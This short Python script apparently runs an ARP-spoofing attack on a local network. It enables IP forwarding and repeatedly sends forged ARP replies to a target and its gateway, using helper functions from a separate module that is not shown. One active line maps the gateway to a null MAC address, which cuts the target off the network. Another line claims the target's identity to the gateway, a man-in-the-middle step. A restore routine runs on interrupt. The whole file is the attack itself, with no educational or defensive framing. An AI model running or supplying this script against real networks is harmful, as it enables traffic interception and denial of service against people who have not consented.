from spoofing_services import *
import time


# if __name__ == "main":
target_ip = ""
gateway_ip = ""
enableIPRoute("Linux")

try:
    while True:
        # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
        spoof(target_ip, gateway_ip, "00:00:00:00:00:00")    # like to the target saying that the gateway's IP is a non-existent one
        spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
        time.sleep(1)
except KeyboardInterrupt:
    print("Restoring the network, please wait...")
    unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
    unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is